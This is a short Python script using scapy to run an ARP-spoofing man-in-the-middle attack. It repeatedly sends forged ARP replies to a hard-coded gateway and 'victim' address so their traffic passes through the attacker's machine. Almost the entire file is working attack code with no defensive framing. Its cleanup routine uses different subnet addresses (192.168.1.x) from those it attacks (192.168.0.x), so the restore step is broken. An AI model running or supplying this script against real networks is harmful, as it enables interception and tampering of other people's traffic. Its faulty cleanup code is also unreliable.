#!/usr/bin/python

import scapy.all as scapy
from scapy.config import conf


def restore_defaults(dest, source):
    # getting the real MACs
    target_mac = get_mac(dest)  # 1st (router), then (windows)
    source_mac = get_mac(source)
    # creating the packet
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    # sending the packet
    scapy.send(packet, iface=conf.iface, verbose=False)


def get_mac(ip):
    # request that contain the IP destination of the target
    request = scapy.ARP(pdst=ip)
    # broadcast packet creation
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # concat packets
    final_packet = broadcast / request
    # getting the response
    answer = scapy.srp(final_packet, iface=conf.iface, timeout=2, verbose=False)[0]
    # getting the MAC (its src because its a response)
    mac = answer[0][1].hwsrc
    return mac


# we will send the packet to the target by pretending being the spoofed
def spoofing(target, mac_target, spoofed):
    # generating the spoofed packet modifying the source and the target
    packet = scapy.ARP(op=2, hwdst=mac_target, pdst=target, psrc=spoofed)
    # sending the packet
    scapy.send(packet, iface=conf.iface, verbose=False)


def main():
    try:
        gw = "192.168.0.1"
        mac_gw = get_mac(gw)
        victim = "192.168.0.22"
        mac_victim = get_mac(victim)
        while True:
            spoofing(gw, mac_gw, victim)  # router (source, dest -> attacker machine)
            spoofing(victim, mac_victim, gw)  # win PC
    except KeyboardInterrupt:
        print("[!] Process stopped. Restoring defaults .. please hold")
        restore_defaults("192.168.1.1", "192.168.1.22")  # router (source, dest -> attacker machine)
        restore_defaults("192.168.1.22", "192.168.1.1")  # win PC
        exit(0)


if __name__ == "__main__":
    main()
